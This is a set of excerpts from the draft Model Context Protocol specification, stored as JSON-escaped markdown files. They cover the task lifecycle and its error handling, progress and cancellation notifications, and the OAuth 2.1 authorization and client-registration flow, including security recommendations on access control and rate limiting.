\"status\": \"working\",\n        \"createdAt\": \"2025-11-25T10:30:00Z\",\n        \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n        \"ttl\": 30000,\n        \"pollInterval\": 5000\n      },\n      {\n        \"taskId\": \"abc123-def456-ghi789\",\n        \"status\": \"completed\",\n        \"createdAt\": \"2025-11-25T09:15:00Z\",\n        \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n        \"ttl\": 60000\n      }\n    ],\n    \"nextCursor\": \"next-page-cursor\"\n  }\n}\n```\n\n### Cancelling Tasks\n\nTo explicitly cancel a task, requestors can send a [`tasks/cancel`](/specification/draft/schema#tasks%2Fcancel) request.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 6,\n  \"method\": \"tasks/cancel\",\n  \"params\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 6,\n  \"result\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\",\n    \"status\": \"cancelled\",\n    \"statusMessage\": \"The task was cancelled by request.\",\n    \"createdAt\": \"2025-11-25T10:30:00Z\",\n    \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n    \"ttl\": 30000,\n    \"pollInterval\": 5000\n  }\n}\n```\n\n## Behavior Requirements\n\nThese requirements apply to all parties that support receiving task-augmented requests.\n\n### Task Support and Handling\n\n1. Receivers that do not declare the task capability for a request type **MUST** process requests of that type normally, ignoring any task-augmentation metadata if present.\n1. Receivers that declare the task capability for a request type **MAY** return an error for non-task-augmented requests, requiring requestors to use task augmentation.\n\n### Task ID Requirements\n\n1. Task IDs **MUST** be a string value.\n1. Task IDs **MUST** be generated by the receiver when creating a task.\n1. Task IDs **MUST** be unique among all tasks controlled by the receiver.\n\n### Task Status Lifecycle\n\n1. Tasks **MUST** begin in the `working` status when created.\n1. Receivers **MUST** only transition tasks through the following valid paths:\n   1. From `working`: may move to `input_required`, `completed`, `failed`, or `cancelled`\n   1. From `input_required`: may move to `working`, `completed`, `failed`, or `cancelled`\n   1. Tasks with a `completed`, `failed`, or `cancelled` status are in a terminal state and **MUST NOT** transition to any other status\n\n**Task Status State Diagram:**\n\n```mermaid\nstateDiagram-v2\n    [*] --> working\n\n    working --> input_required\n    working --> terminal\n\n    input_required --> working\n    input_required --> terminal\n\n    terminal --> [*]\n\n    note right of terminal\n        Terminal states:\n        • completed\n        • failed\n        • cancelled\n    end note\n```\n\n### Input Required Status\n\n<Note>\n\nWith the Streamable HTTP (SSE) transport, servers often close SSE streams after delivering a response message, which can lead to ambiguity regarding the stream used for subsequent task messages.\n\nServers can handle this by enqueueing messages to the client to side-channel task-related messages alongside other responses.\n\nServers have flexibility in how they manage SSE streams during task polling and result retrieval, and clients **SHOULD** expect messages to be delivered on any SSE stream, including the HTTP GET stream.\nOne possible approach is maintaining an SSE stream on `tasks/result` (see notes on the `input_required` status).\nWhere possible, servers **SHOULD NOT** upgrade to an SSE stream in response to a `tasks/get` request, as the client has indicated it wishes to poll for a result.\n\nWhile this note is not prescriptive regarding the specific usage of SSE streams, all implementations **MUST** continue to comply with the existing [Streamable HTTP transport specification](../transports#sending-messages-to-the-server).\n\n</Note>\n\n1. When the task receiver has messages for the requestor that are necessary to complete the task, the receiver **SHOULD** move the task to the `input_required` status.\n1. The receiver **MUST** include the `io.modelcontextprotocol/related-task` metadata in the request to associate it with the task.\n1. When the requestor encounters the `input_required` status, it **SHOULD** preemptively call `tasks/result`.\n1. When the receiver receives all required input, the task **SHOULD** transition out of `input_required` status (typically back to `working`).\n\n### TTL and Resource Management\n\n1. Receivers **MUST** include a `createdAt` [ISO 8601](https://datatracker.ietf.org/doc/html/rfc3339#section-5)-formatted timestamp in all task responses to indicate when the task was created.\n1. Receivers **MUST** include a `lastUpdatedAt` [ISO 8601](https://datatracker.ietf.org/doc/html/rfc3339#section-5)-formatted timestamp in all task responses to indicate when the task was last updated.\n1. Receivers **MAY** override the requested `ttl` duration.\n1. Receivers **MUST** include the actual `ttl` duration (or `null` for unlimited) in `tasks/get` responses.\n1. After a task's `ttl` lifetime has elapsed, receivers **MAY** delete the task and its results, regardless of the task status.\n1. Receivers **MAY** include a `pollInterval` value (in milliseconds) in `tasks/get` responses to suggest polling intervals. Requestors **SHOULD** respect this value when provided.\n\n### Result Retrieval\n\n1. Receivers that accept a task-augmented request **MUST** return a `CreateTaskResult` as the response. This result **SHOULD** be returned as soon as possible after accepting the task.\n1. When a receiver receives a `tasks/result` request for a task in a terminal status (`completed`, `failed`, or `cancelled`), it **MUST** return the final result of the underlying request, whether that is a successful result or a JSON-RPC error.\n1. When a receiver receives a `tasks/result` request for a task in any other non-terminal status (`working` or `input_required`), it **MUST** block the response until the task reaches a terminal status.\n1. For tasks in a terminal status, receivers **MUST** return from `tasks/result` exactly what the underlying request would have returned, whether that is a successful result or a JSON-RPC error.\n\n### Associating Task-Related Messages\n\n1. All requests, notifications, and responses related to a task **MUST** include the `io.modelcontextprotocol/related-task` key in their `_meta` field, with the value set to an object with a `taskId` matching the associated task ID.\n   1. For example, an elicitation that a task-augmented tool call depends on **MUST** share the same related task ID with that tool call's task.\n1. For the `tasks/get`, `tasks/result`, and `tasks/cancel` operations, the `taskId` parameter in the request **MUST** be used as the source of truth for identifying the target task. Requestors **SHOULD NOT** include `io.modelcontextprotocol/related-task` metadata in these requests, and receivers **MUST** ignore such metadata if present in favor of the RPC method parameter.\n   Similarly, for the `tasks/get`, `tasks/list`, and `tasks/cancel` operations, receivers **SHOULD NOT** include `io.modelcontextprotocol/related-task` metadata in the result messages, as the `taskId` is already present in the response structure.\n\n### Task Notifications\n\n1. Receivers **MAY** send `notifications/tasks/status` notifications when a task's status changes.\n1. Requestors **MUST NOT** rely on receiving the `notifications/tasks/status` notification, as it is optional.\n1. When sent, the `notifications/tasks/status` notification **SHOULD NOT** include the `io.modelcontextprotocol/related-task` metadata, as the task ID is already present in the notification parameters.\n\n### Task Progress Notifications\n\nTask-augmented requests support progress notifications as defined in the [progress](./progress) specification. The `progressToken` provided in the initial request remains valid throughout the task lifetime.\n\n### Task Listing\n\n1. Receivers **SHOULD** use cursor-based pagination to limit the number of tasks returned in a single response.\n1. Receivers **MUST** include a `nextCursor` in the response if more tasks are available.\n1. Requestors **MUST** treat cursors as opaque tokens and not attempt to parse or modify them.\n1. If a task is retrievable via `tasks/get` for a requestor, it **MUST** be retrievable via `tasks/list` for that requestor.\n\n### Task Cancellation\n\n1. Receivers **MUST** reject cancellation requests for tasks already in a terminal status (`completed`, `failed`, or `cancelled`) with error code `-32602` (Invalid params).\n1. Upon receiving a valid cancellation request, receivers **SHOULD** attempt to stop the task execution and **MUST** transition the task to `cancelled` status before sending the response.\n1. Once a task is cancelled, it **MUST** remain in `cancelled` status even if execution continues to completion or fails.\n1. The `tasks/cancel` operation does not define deletion behavior. However, receivers **MAY** delete cancelled tasks at their discretion at any time, including immediately after cancellation or after the task `ttl` expires.\n1. Requestors **SHOULD NOT** rely on cancelled tasks being retained for any specific duration and should retrieve any needed information before cancelling.\n\n## Message Flow\n\n### Basic Task Lifecycle\n\n```mermaid\nsequenceDiagram\n    participant C as Client (Requestor)\n    participant S as Server (Receiver)\n    Note over C,S: 1.

The task state includes:\n\n- `taskId`: Unique identifier for the task\n- `status`: Current state of the task execution\n- `statusMessage`: Optional human-readable message describing the current state (can be present for any status, including error details for failed tasks)\n- `createdAt`: ISO 8601 timestamp when the task was created\n- `ttl`: Time in milliseconds from creation before task may be deleted\n- `pollInterval`: Suggested time in milliseconds between status checks\n- `lastUpdatedAt`: ISO 8601 timestamp when the task status was last updated\n\n### Task Status\n\nTasks can be in one of the following states:\n\n- `working`: The request is currently being processed.\n- `input_required`: The receiver needs input from the requestor. The requestor should call `tasks/result` to receive input requests, even though the task has not reached a terminal state.\n- `completed`: The request completed successfully and results are available.\n- `failed`: The associated request did not complete successfully. For tool calls specifically, this includes cases where the tool call result has `isError` set to true.\n- `cancelled`: The request was cancelled before completion.\n\n### Task Parameters\n\nWhen augmenting a request with task execution, the `task` field is included in the request parameters:\n\n```json\n{\n  \"task\": {\n    \"ttl\": 60000\n  }\n}\n```\n\nFields:\n\n- `ttl` (number, optional): Requested duration in milliseconds to retain task from creation\n\n### Related Task Metadata\n\nAll requests, responses, and notifications associated with a task **MUST** include the `io.modelcontextprotocol/related-task` key in `_meta`:\n\n```json\n{\n  \"io.modelcontextprotocol/related-task\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\"\n  }\n}\n```\n\nThis associates messages with their originating task across the entire request lifecycle.\n\nFor the `tasks/get`, `tasks/list`, and `tasks/cancel` operations, requestors and receivers **SHOULD NOT** include this metadata in their messages, as the `taskId` is already present in the message structure.\nThe `tasks/result` operation **MUST** include this metadata in its response, as the result structure itself does not contain the task ID.\n\n## Error Handling\n\nTasks use two error reporting mechanisms:\n\n1. **Protocol Errors**: Standard JSON-RPC errors for protocol-level issues\n1. **Task Execution Errors**: Errors in the underlying request execution, reported through task status\n\n### Protocol Errors\n\nReceivers **MUST** return standard JSON-RPC errors for the following protocol error cases:\n\n- Invalid or nonexistent `taskId` in `tasks/get`, `tasks/result`, or `tasks/cancel`: `-32602` (Invalid params)\n- Invalid or nonexistent cursor in `tasks/list`: `-32602` (Invalid params)\n- Attempt to cancel a task already in a terminal status: `-32602` (Invalid params)\n- Internal errors: `-32603` (Internal error)\n\nAdditionally, receivers **MAY** return the following errors:\n\n- Non-task-augmented request when receiver requires task augmentation for that request type: `-32600` (Invalid request)\n\nReceivers **SHOULD** provide informative error messages to describe the cause of errors.\n\n**Example: Task augmentation required**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -32600,\n    \"message\": \"Task augmentation required for tools/call requests\"\n  }\n}\n```\n\n**Example: Task not found**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 70,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Failed to retrieve task: Task not found\"\n  }\n}\n```\n\n**Example: Task expired**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 71,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Failed to retrieve task: Task has expired\"\n  }\n}\n```\n\n<Note>\n\nReceivers are not required to retain tasks indefinitely. It is compliant behavior for a receiver to return an error stating the task cannot be found if it has purged an expired task.\n\n</Note>\n\n**Example: Task cancellation rejected (already terminal)**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 74,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Cannot cancel task: already in terminal status 'completed'\"\n  }\n}\n```\n\n### Task Execution Errors\n\nWhen the underlying request does not complete successfully, the task moves to the `failed` status. This includes JSON-RPC protocol errors during request execution, or for tool calls specifically, when the tool result has `isError` set to true. The `tasks/get` response **SHOULD** include a `statusMessage` field with diagnostic information about the failure.\n\n**Example: Task with execution error**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"result\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f820fe840\",\n    \"status\": \"failed\",\n    \"createdAt\": \"2025-11-25T10:30:00Z\",\n    \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n    \"ttl\": 30000,\n    \"statusMessage\": \"Tool execution failed: API rate limit exceeded\"\n  }\n}\n```\n\nFor tasks that wrap tool call requests, when the tool result has `isError` set to `true`, the task should reach `failed` status.\n\nThe `tasks/result` endpoint returns exactly what the underlying request would have returned:\n\n- If the underlying request resulted in a JSON-RPC error, `tasks/result` **MUST** return that same JSON-RPC error.\n- If the request completed with a JSON-RPC response, `tasks/result` **MUST** return a successful JSON-RPC response containing that result.\n\n## Security Considerations\n\n### Task Isolation and Access Control\n\nTask IDs are the primary mechanism for accessing task state and results. Without proper access controls, any party that can guess or obtain a task ID could potentially access sensitive information or manipulate tasks they did not create.\n\nWhen an authorization context is provided, receivers **MUST** bind tasks to said context.\n\nContext-binding is not practical for all applications. Some MCP servers operate in environments without authorization, such as single-user tools, or use transports that don't support authorization.\nIn these scenarios, receivers **SHOULD** document this limitation clearly, as task results may be accessible to any requestor that can guess the task ID.\nIf context-binding is unavailable, receivers **MUST** generate cryptographically secure task IDs with enough entropy to prevent guessing and should consider using shorter TTL durations to reduce the exposure window.\n\nIf context-binding is available, receivers **MUST** reject `tasks/get`, `tasks/result`, and `tasks/cancel` requests for tasks that do not belong to the same authorization context as the requestor. For `tasks/list` requests, receivers **MUST** ensure the returned task list includes only tasks associated with the requestor's authorization context.\n\nAdditionally, receivers **SHOULD** implement rate limiting on task operations to prevent denial-of-service and enumeration attacks.\n\n### Resource Management\n\n1. Receivers **SHOULD**:\n   1. Enforce limits on concurrent tasks per requestor\n   1. Enforce maximum `ttl` durations to prevent indefinite resource retention\n   1. Clean up expired tasks promptly to free resources\n   1. Document maximum supported `ttl` duration\n   1. Document maximum concurrent tasks per requestor\n   1. Implement monitoring and alerting for resource usage\n\n### Audit and Logging\n\n1. Receivers **SHOULD**:\n   1. Log task creation, completion, and retrieval events for audit purposes\n   1. Include auth context in logs when available\n   1. Monitor for suspicious patterns (e.g., many failed task lookups, excessive polling)\n1. Requestors **SHOULD**:\n   1. Log task lifecycle events for debugging and audit purposes\n   1. Track task IDs and their associated operations\n"}

Progress notifications **MUST** only reference tokens that:\n   - Were provided in an active request\n   - Are associated with an in-progress operation\n\n2. Receivers of progress requests **MAY**:\n   - Choose not to send any progress notifications\n   - Send notifications at whatever frequency they deem appropriate\n   - Omit the total value if unknown\n\n3. For [task-augmented requests](./tasks), the `progressToken` provided in the original request **MUST** continue to be used for progress notifications throughout the task's lifetime, even after the `CreateTaskResult` has been returned. The progress token remains valid and associated with the task until the task reaches a terminal status.\n   - Progress notifications for tasks **MUST** use the same `progressToken` that was provided in the initial task-augmented request\n   - Progress notifications for tasks **MUST** stop after the task reaches a terminal status (`completed`, `failed`, or `cancelled`)\n\n```mermaid\nsequenceDiagram\n    participant Sender\n    participant Receiver\n\n    Note over Sender,Receiver: Request with progress token\n    Sender->>Receiver: Method request with progressToken\n\n    Note over Sender,Receiver: Progress updates\n    Receiver-->>Sender: Progress notification (0.2/1.0)\n    Receiver-->>Sender: Progress notification (0.6/1.0)\n    Receiver-->>Sender: Progress notification (1.0/1.0)\n\n    Note over Sender,Receiver: Operation complete\n    Receiver->>Sender: Method response\n```\n\n## Implementation Notes\n\n- Senders and receivers **SHOULD** track active progress tokens\n- Both parties **SHOULD** implement rate limiting to prevent flooding\n- Progress notifications **MUST** stop after completion\n"}
{"source":"github","repo":"mcp-spec","path":"docs/specification/draft/basic/utilities/cancellation.mdx","content":"---\ntitle: Cancellation\n---\n\n<div id=\"enable-section-numbers\" />\n\n<Info>**Protocol Revision**: draft</Info>\n\nThe Model Context Protocol (MCP) supports optional cancellation of in-progress requests\nthrough notification messages. Either side can send a cancellation notification to\nindicate that a previously-issued request should be terminated.\n\n## Cancellation Flow\n\nWhen a party wants to cancel an in-progress request, it sends a `notifications/cancelled`\nnotification containing:\n\n- The ID of the request to cancel\n- An optional reason string that can be logged or displayed\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/cancelled\",\n  \"params\": {\n    \"requestId\": \"123\",\n    \"reason\": \"User requested cancellation\"\n  }\n}\n```\n\n## Behavior Requirements\n\n1. Cancellation notifications **MUST** only reference requests that:\n   - Were previously issued in the same direction\n   - Are believed to still be in-progress\n1. The `initialize` request **MUST NOT** be cancelled by clients\n1. For [task-augmented requests](./tasks), the `tasks/cancel` request **MUST** be used instead of the `notifications/cancelled` notification.

This specification defines the authorization flow for HTTP-based transports.\n\n### Protocol Requirements\n\nAuthorization is **OPTIONAL** for MCP implementations. When supported:\n\n- Implementations using an HTTP-based transport **SHOULD** conform to this specification.\n- Implementations using an STDIO transport **SHOULD NOT** follow this specification, and\n  instead retrieve credentials from the environment.\n- Implementations using alternative transports **MUST** follow established security best\n  practices for their protocol.\n\n### Standards Compliance\n\nThis authorization mechanism is based on established specifications listed below, but\nimplements a selected subset of their features to ensure security and interoperability\nwhile maintaining simplicity:\n\n- OAuth 2.1 IETF DRAFT ([draft-ietf-oauth-v2-1-13](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13))\n- OAuth 2.0 Authorization Server Metadata\n  ([RFC8414](https://datatracker.ietf.org/doc/html/rfc8414))\n- OAuth 2.0 Dynamic Client Registration Protocol\n  ([RFC7591](https://datatracker.ietf.org/doc/html/rfc7591))\n- OAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728))\n- OAuth Client ID Metadata Documents ([draft-ietf-oauth-client-id-metadata-document-00](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00))\n\n## Roles\n\nA protected _MCP server_ acts as an [OAuth 2.1 resource server](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#name-roles),\ncapable of accepting and responding to protected resource requests using access tokens.\n\nAn _MCP client_ acts as an [OAuth 2.1 client](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#name-roles),\nmaking protected resource requests on behalf of a resource owner.\n\nThe _authorization server_ is responsible for interacting with the user (if necessary) and issuing access tokens for use at the MCP server.\nThe implementation details of the authorization server are beyond the scope of this specification. It may be hosted with the\nresource server or a separate entity. The [Authorization Server Discovery section](#authorization-server-discovery)\nspecifies how an MCP server indicates the location of its corresponding authorization server to a client.\n\n## Overview\n\n1. Authorization servers **MUST** implement OAuth 2.1 with appropriate security\n   measures for both confidential and public clients.\n\n2. Authorization servers and MCP clients **SHOULD** support OAuth Client ID Metadata Documents\n   ([draft-ietf-oauth-client-id-metadata-document-00](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00)).\n\n3. Authorization servers and MCP clients **MAY** support the OAuth 2.0 Dynamic Client Registration\n   Protocol ([RFC7591](https://datatracker.ietf.org/doc/html/rfc7591)).\n\n4. MCP servers **MUST** implement OAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728)).\n   MCP clients **MUST** use OAuth 2.0 Protected Resource Metadata for authorization server discovery.\n\n5. MCP authorization servers **MUST** provide at least one of the following discovery mechanisms:\n   - OAuth 2.0 Authorization Server Metadata ([RFC8414](https://datatracker.ietf.org/doc/html/rfc8414))\n   - [OpenID Connect Discovery 1.0](https://openid.net/specs/openid-connect-discovery-1_0.html)\n\n   MCP clients **MUST** support both discovery mechanisms to obtain the information required to interact with the authorization server.\n\n## Authorization Server Discovery\n\nThis section describes the mechanisms by which MCP servers advertise their associated\nauthorization servers to MCP clients, as well as the discovery process through which MCP\nclients can determine authorization server endpoints and supported capabilities.\n\n### Authorization Server Location\n\nMCP servers **MUST** implement the OAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728))\nspecification to indicate the locations of authorization servers. The Protected Resource Metadata document returned by the MCP server **MUST** include\nthe `authorization_servers` field containing at least one authorization server.\n\nThe specific use of `authorization_servers` is beyond the scope of this specification; implementers should consult\nOAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728)) for\nguidance on implementation details.\n\nImplementors should note that Protected Resource Metadata documents can define multiple authorization servers. The responsibility for selecting which authorization server to use lies with the MCP client, following the guidelines specified in\n[RFC9728 Section 7.6 \"Authorization Servers\"](https://datatracker.ietf.org/doc/html/rfc9728#name-authorization-servers).\n\n### Protected Resource Metadata Discovery Requirements\n\nMCP servers **MUST** implement one of the following discovery mechanisms to provide authorization server location information to MCP clients:\n\n1. **WWW-Authenticate Header**: Include the resource metadata URL in the `WWW-Authenticate` HTTP header under `resource_metadata` when returning `401 Unauthorized` responses, as described in [RFC9728 Section 5.1](https://datatracker.ietf.org/doc/html/rfc9728#name-www-authenticate-response).\n\n2. **Well-Known URI**: Serve metadata at a well-known URI as specified in [RFC9728](https://datatracker.ietf.org/doc/html/rfc9728). This can be either:\n   - At the path of the server's MCP endpoint: `https://example.com/public/mcp` could host metadata at `https://example.com/.well-known/oauth-protected-resource/public/mcp`\n   - At the root: `https://example.com/.well-known/oauth-protected-resource`\n\nMCP clients **MUST** support both discovery mechanisms and use the resource metadata URL from the parsed `WWW-Authenticate` headers when present; otherwise, they **MUST** fall back to constructing and requesting the well-known URIs in the order listed above.\n\nMCP servers **SHOULD** include a `scope` parameter in the `WWW-Authenticate` header as defined in\n[RFC 6750 Section 3](https://datatracker.ietf.org/doc/html/rfc6750#section-3)\nto indicate the scopes required for accessing the resource. This provides clients with immediate\nguidance on the appropriate scopes to request during authorization,\nfollowing the principle of least privilege and preventing clients from requesting excessive permissions.\n\nThe scopes included in the `WWW-Authenticate` challenge **MAY** match `scopes_supported`, be a subset\nor superset of it, or an alternative collection that is neither a strict subset nor\nsuperset. Clients **MUST NOT** assume any particular set relationship between the challenged\nscope set and `scopes_supported`. Clients **MUST** treat the scopes provided in the\nchallenge as authoritative for satisfying the current request. Servers **SHOULD** strive for\nconsistency in how they construct scope sets but they are not required to surface every dynamically\nissued scope through `scopes_supported`.\n\nExample 401 response with scope guidance:\n\n```http\nHTTP/1.1 401 Unauthorized\nWWW-Authenticate: Bearer resource_metadata=\"https://mcp.example.com/.well-known/oauth-protected-resource\",\n                         scope=\"files:read\"\n```\n\nMCP clients **MUST** be able to parse `WWW-Authenticate` headers and respond appropriately to `HTTP 401 Unauthorized` responses from the MCP server.\n\nIf the `scope` parameter is absent, clients **SHOULD** apply the fallback behavior defined in the [Scope Selection Strategy](#scope-selection-strategy) section.\n\n### Authorization Server Metadata Discovery\n\nTo handle different issuer URL formats and ensure interoperability with both OAuth 2.0 Authorization Server Metadata and OpenID Connect Discovery 1.0 specifications, MCP clients **MUST** attempt multiple well-known endpoints when discovering authorization server metadata.\n\nThe discovery approach is based on [RFC8414 Section 3.1 \"Authorization Server Metadata Request\"](https://datatracker.ietf.org/doc/html/rfc8414#section-3.1) for OAuth 2.0 Authorization Server Metadata discovery and [RFC8414 Section 5 \"Compatibility Notes\"](https://datatracker.ietf.org/doc/html/rfc8414#section-5) for OpenID Connect Discovery 1.0 interoperability.\n\nFor issuer URLs with path components (e.g., `https://auth.example.com/tenant1`), clients **MUST** try endpoints in the following priority order:\n\n1. OAuth 2.0 Authorization Server Metadata with path insertion: `https://auth.example.com/.well-known/oauth-authorization-server/tenant1`\n2. OpenID Connect Discovery 1.0 with path insertion: `https://auth.example.com/.well-known/openid-configuration/tenant1`\n3. OpenID Connect Discovery 1.0 path appending: `https://auth.example.com/tenant1/.well-known/openid-configuration`\n\nFor issuer URLs without path components (e.g., `https://auth.example.com`), clients **MUST** try:\n\n1. OAuth 2.0 Authorization Server Metadata: `https://auth.example.com/.well-known/oauth-authorization-server`\n2. OpenID Connect Discovery 1.0: `https://auth.example.com/.well-known/openid-configuration`\n\n### Authorization Server Discovery Sequence Diagram\n\nThe following diagram outlines an example flow:\n\n```mermaid\nsequenceDiagram\n    participant C as Client\n    participant M as MCP Server (Resource Server)\n    participant A as Authorization Server\n\n    Note over C: Attempt unauthenticated MCP request\n    C->>M: MCP request without token\n    M-->>C: HTTP 401 Unauthorized (may include WWW-Authenticate header)\n\n    alt Header includes resource_metadata\n        Note over C: Extract resource_metadata URL from header\n        C->>M: GET resource_metadata URI\n        M-->>C: Resource metadata with authorization server URL\n    else No resource_metadata in header\n        Note over C: Fallback to well-known URI probing\n        Note over M: _Not applicable if the MCP server is at the root_\n        C->>M: GET /.well-known/oauth-protected-resource/mcp\n        alt Sub-path metadata found\n            M-->>C: Resource metadata with authorization server URL\n        else Sub-path not found\n            C->>M: GET /.well-known/oauth-protected-resource\n            alt Root metadata found\n                M-->>C: Resource metadata with authorization server URL\n            else Root metadata not found\n                Note over C: Abort or use pre-configured values\n            end\n        end\n    end\n\n    Note over C: Validate RS metadata,<br />build AS metadata URL\n\n    C->>A: GET Authorization server metadata endpoint\n    Note over C,A: Try OAuth 2.0 and OpenID Connect<br/>discovery endpoints in priority order\n    A-->>C: Authorization server metadata\n\n    Note over C,A: OAuth 2.1 authorization flow happens here\n\n    C->>A: Token request\n    A-->>C: Access token\n\n    C->>M: MCP request with access token\n    M-->>C: MCP response\n    Note over C,M: MCP communication continues with valid token\n```\n\n## Client Registration Approaches\n\nMCP supports three client registration mechanisms. Choose based on your scenario:\n\n- **Client ID Metadata Documents**: When client and server have no prior relationship (most common)\n- **Pre-registration**: When client and server have an existing relationship\n- **Dynamic Client Registration**: For backwards compatibility or specific requirements\n\nClients supporting all options **SHOULD** follow the following priority order:\n\n1. Use pre-registered client information for the server if the client has it available\n2. Use Client ID Metadata Documents if the Authorization Server indicates if the server supports it (via `client_id_metadata_document_supported` in OAuth Authorization Server Metadata)\n3. Use Dynamic Client Registration as a fallback if the Authorization Server supports it (via `registration_endpoint` in OAuth Authorization Server Metadata)\n4. Prompt the user to enter the client information if no other option is available\n\n### Client ID Metadata Documents\n\nMCP clients and authorization servers **SHOULD** support OAuth Client ID Metadata Documents as specified in\n[OAuth Client ID Metadata Document](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00).\nThis approach enables clients to use HTTPS URLs as client identifiers, where the URL points to a JSON document\ncontaining client metadata. This addresses the common MCP scenario where servers and clients have\nno pre-existing relationship.\n\n#### Implementation Requirements\n\nMCP implementations supporting Client ID Metadata Documents **MUST** follow the requirements specified in\n[OAuth Client ID Metadata Document](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00).\nKey requirements include:\n\n**For MCP Clients:**\n\n- Clients **MUST** host their metadata document at an HTTPS URL following RFC requirements\n- The `client_id` URL **MUST** use the \"https\" scheme and contain a path component, e.g. `https://example.com/client.json`\n- The metadata document **MUST** include at least the following properties: `client_id`, `client_name`, `redirect_uris`\n- Clients **MUST** ensure the `client_id` value in the metadata matches the document URL exactly\n- Clients **MAY** use `private_key_jwt` for client authentication (e.g., for requests to the token endpoint) with appropriate JWKS configuration as described in [Section 6.2 of Client ID Metadata Document](https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6.2)\n\n**For Authorization Servers:**\n\n- **SHOULD** fetch metadata documents when encountering URL-formatted client_ids\n- **MUST** validate that the fetched document's `client_id` matches the URL exactly\n- **SHOULD** cache metadata respecting HTTP cache headers\n- **MUST** validate redirect URIs presented in an authorization request against those in the metadata document\n- **MUST** validate the document structure is valid JSON and contains required fields\n- **SHOULD** follow the security considerations in [Section 6 of Client ID Metadata Document](https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6)\n\n#### Example Metadata Document\n\n```json\n{\n  \"client_id\": \"https://app.example.com/oauth/client-metadata.json\",\n  \"client_name\": \"Example MCP Client\",\n  \"client_uri\": \"https://app.example.com\",\n  \"logo_uri\": \"https://app.example.com/logo.png\",\n  \"redirect_uris\": [\n    \"http://127.0.0.1:3000/callback\",\n    \"http://localhost:3000/callback\"\n  ],\n  \"grant_types\": [\"authorization_code\"],\n  \"response_types\": [\"code\"],\n  \"token_endpoint_auth_method\": \"none\"\n}\n```\n\n#### Client ID Metadata Documents Flow\n\nThe following diagram illustrates the complete flow when using Client ID Metadata Documents:\n\n```mermaid\nsequenceDiagram\n    participant User\n    participant Client as MCP Client\n    participant Server as Authorization Server\n    participant Metadata as Metadata Endpoint<br/>(Client's HTTPS URL)\n    participant Resource as MCP Server\n\n    Note over Client,Metadata: Client hosts metadata at<br/>https://app.example.com/oauth/metadata.json\n\n    User->>Client: Initiates connection to MCP Server\n    Client->>Server: Authorization Request<br/>client_id=https://app.example.com/oauth/metadata.json<br/>redirect_uri=http://localhost:3000/callback\n\n    Server->>User: Authentication prompt\n    User->>Server: Provides credentials\n    Note over Server: Authenticates user\n\n    Note over Server: Detects URL-formatted client_id\n\n    Server->>Metadata: GET https://app.example.com/oauth/metadata.json\n    Metadata-->>Server: JSON Metadata Document<br/>{client_id, client_name, redirect_uris, ...}\n\n    Note over Server: Validates:<br/>1. client_id matches URL<br/>2. redirect_uri in allowed list<br/>3.

This could be:\n\n1. Hardcode a client ID (and, if applicable, client credentials) specifically for the MCP client to use when\n   interacting with that authorization server, or\n2. Present a UI to users that allows them to enter these details, after registering an\n   OAuth client themselves (e.g., through a configuration interface hosted by the\n   server).\n\n### Dynamic Client Registration\n\nMCP clients and authorization servers **MAY** support the\nOAuth 2.0 Dynamic Client Registration Protocol [RFC7591](https://datatracker.ietf.org/doc/html/rfc7591)\nto allow MCP clients to obtain OAuth client IDs without user interaction.\nThis option is included for backwards compatibility with earlier versions of the MCP authorization spec.\n\n## Scope Selection Strategy\n\nWhen implementing authorization flows, MCP clients **SHOULD** follow the principle of least privilege by requesting\nonly the scopes necessary for their intended operations. During the initial authorization handshake, MCP clients\n**SHOULD** follow this priority order for scope selection:\n\n1. **Use `scope` parameter** from the initial `WWW-Authenticate` header in the 401 response, if provided\n2. **If `scope` is not available**, use all scopes defined in `scopes_supported` from the Protected Resource Metadata document, omitting the `scope` parameter if `scopes_supported` is undefined.\n\nThis approach accommodates the general-purpose nature of MCP clients, which typically lack domain-specific knowledge to make informed decisions about individual scope selection. Requesting all available scopes allows the authorization server and end-user to determine appropriate permissions during the consent process.\n\nThis approach minimizes user friction while following the principle of least privilege.\nThe `scopes_supported` field is intended to represent the minimal set of scopes necessary\nfor basic functionality (see [Scope Minimization](/specification/draft/basic/security_best_practices#scope-minimization)),\nwith additional scopes requested incrementally through the step-up authorization flow steps\ndescribed in the [Scope Challenge 